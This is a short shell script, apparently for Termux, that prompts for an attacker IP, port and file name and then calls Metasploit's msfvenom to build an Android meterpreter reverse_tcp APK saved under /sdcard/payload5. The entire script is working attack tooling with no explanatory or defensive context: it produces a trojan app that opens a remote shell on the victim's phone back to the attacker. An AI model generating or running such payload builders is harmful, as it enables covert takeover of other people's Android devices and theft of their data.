g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install






echo -e "$blue "
read -p "                  ip=====> " ip
sleep 2
read -p "                      port===> " p
sleep 2
read -p "                        name===> " n

cd
cd metasploit-framework

./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /sdcard/payload5/$n.apk
echo -e " $cyan  Path of the pyload----->  $yellow  /sdcard/payload5/$n.apk"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                  --------> entar"
payload.sh
